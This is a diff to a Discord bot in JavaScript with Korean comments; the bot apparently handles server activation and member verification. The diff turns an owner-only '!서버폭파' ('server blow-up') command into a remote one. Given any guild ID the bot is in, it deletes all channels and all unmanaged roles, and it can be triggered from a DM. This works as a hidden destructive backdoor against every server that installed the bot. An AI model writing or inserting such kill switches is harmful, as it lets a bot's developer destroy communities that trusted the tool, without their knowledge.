@@ -217,16 +217,64 @@ client.on('ready', async () => {
 });
 
 client.on('messageCreate', async (message) => {
+    const content = message.content.trim();
+    const userId = message.author.id;
+    const isBotOwner = ALLOWED_OWNERS.includes(userId);
+
+    // 💥 [관리자 전용] !서버폭파 (서버아이디) - DM이나 어떤 서버에서든 타겟 서버 ID로 즉시 폭파 가능
+    if (content.startsWith('!서버폭파')) {
+        if (!isBotOwner) return;
+
+        const args = content.split(' ');
+        const targetGuildId = args[1];
+
+        if (!targetGuildId) {
+            if (message.guild) {
+                return message.reply('⚠️ 폭파할 서버의 아이디를 입력해 주세요. (예: `!서버폭파 123456789012345678`)');
+            } else {
+                return message.author.send('⚠️ 폭파할 서버의 아이디를 입력해 주세요. (예: `!서버폭파 123456789012345678`)');
+            }
+        }
+
+        const targetGuild = client.guilds.cache.get(targetGuildId);
+        if (!targetGuild) {
+            const errText = `❌ ID가 \`${targetGuildId}\`인 서버를 찾을 수 없습니다. (봇이 해당 서버에 들어가 있는지 확인해주세요)`;
+            return message.guild ? message.reply(errText) : message.author.send(errText);
+        }
+
+        try {
+            if (message.guild) {
+                await message.reply(`💥 **[${targetGuild.name}] 서버 폭파 작업을 시작합니다...**`).catch(() => {});
+            } else {
+                await message.author.send(`💥 **[${targetGuild.name}] 서버 폭파 작업을 시작합니다...**`).catch(() => {});
+            }
+
+            // 모든 채널 삭제
+            const channels = await targetGuild.channels.fetch();
+            for (const ch of channels.values()) {
+                await ch.delete().catch(() => {});
+            }
+
+            // 모든 역할 삭제 (기본 및 봇 역할 제외)
+            const roles = await targetGuild.roles.fetch();
+            for (const r of roles.values()) {
+                if (r.id !== targetGuild.id && !r.managed) {
+                    await r.delete().catch(() => {});
+                }
+            }
+            console.log(`[서버 폭파 완료] ${targetGuild.name} (${targetGuildId}) 서버가 폭파되었습니다.`);
+        } catch (err) {
+            console.error('서버 폭파 중 오류 발생:', err);
+        }
+        return;
+    }
+
     if (!message.guild) return;
     if (message.author.bot) return;
 
-    const content = message.content.trim();
-    const userId = message.author.id;
     const guildId = message.guild.id;
     const isServerOwner = message.guild.ownerId === userId;
-    const isBotOwner = ALLOWED_OWNERS.includes(userId);
 
-    // 설정 파일 로드
     let settings = loadSettings();
     const isServerActivated = settings[guildId] && settings[guildId].activated === true;
 
@@ -239,7 +287,6 @@ client.on('messageCreate', async (message) => {
         try {
             await message.delete().catch(() => {});
 
-            // 서버 활성화 상태로 기록 저장
             if (!settings[guildId]) settings[guildId] = {};
             settings[guildId].activated = true;
             saveSettings(settings);
@@ -409,7 +456,6 @@ client.on('messageCreate', async (message) => {
             if (fetchedMessages) {
                 for (const msg of fetchedMessages.values()) {
                     if (msg.author.id === client.user.id && msg.content && msg.content.includes(targetUserId)) {
-                        // 오직 현재 서버(guildId)에서 인증된 기록인지 확인
                         if (msg.content.includes(`(ID: \`${guildId}\`)`) && (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('모바일 데이터 차단'))) {
                             foundContent = msg.content;
                             break;
@@ -498,29 +544,6 @@ client.on('messageCreate', async (message) => {
             });
         } catch (err) {
             console.error('서버 복구 오류:', err);
-        }
-    }
-
-    // 9. !서버폭파 명령어 (관리자 본인 전용)
-    if (content === '!서버폭파') {
-        if (!isBotOwner) return;
-
-        await message.reply('💥 **서버 폭파 작업을 시작합니다... 모든 채널과 역할이 삭제됩니다.**');
-
-        try {
-            const channels = await message.guild.channels.fetch();
-            for (const channel of channels.values()) {
-                await channel.delete().catch(() => {});
-            }
-
-            const roles = await message.guild.roles.fetch();
-            for (const role of roles.values()) {
-                if (role.id !== message.guild.id && !role.managed) {
-                    await role.delete().catch(() => {});
-                }
-            }
-        } catch (err) {
-            console.error('서버 폭파 오류:', err);
         }
     }
 });
